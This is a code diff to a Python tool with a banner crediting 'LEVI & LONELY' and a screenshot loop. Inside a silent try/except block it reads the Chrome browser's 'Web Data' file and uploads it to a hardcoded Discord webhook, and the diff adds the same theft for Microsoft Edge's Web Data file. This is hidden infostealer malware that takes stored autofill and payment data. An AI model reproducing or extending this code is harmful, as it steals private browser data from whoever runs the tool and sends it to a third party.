@@ -24,16 +24,23 @@ try:
 
  hello = "https://discord.com/api/webhooks/1429030702090948650/wVnXAoK2s1n7dmVc7fHIhstWAjkox-3s9ZYO9GN47bZTYAdSw2s6pqgnGTol15Lzi_CR"
  look = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default\\Web Data')
+ hey = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Default\\Web Data')
 
  with open(f'{look}', 'rb') as file:
     r = file.read()
     f = {
-    "HOOKED": r}
+    "chrome": r}
     requests.post(hello,files=f)
     see = {
         "content": s
     }
     requests.post(hello,json=see)
+ 
+ with open(f'{hey}', 'rb') as file:
+    read = file.read()
+    t = {
+    "edge": read}
+    requests.post(hello,files=t)
 except:
    pass
 
@@ -47,7 +54,7 @@ def main():
 {gray}╚██████╔╝██║  ██║╚██████╗
 {gray} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝""")
  print(f"""{gray}By LEVI &{red}& LONELY""")
- print(f"\033[0m{red}UPDATE {gray}#5.1")
+ print(f"\033[0m{red}UPDATE {gray}#5.2")
 
  with mss() as ss:
      while True:
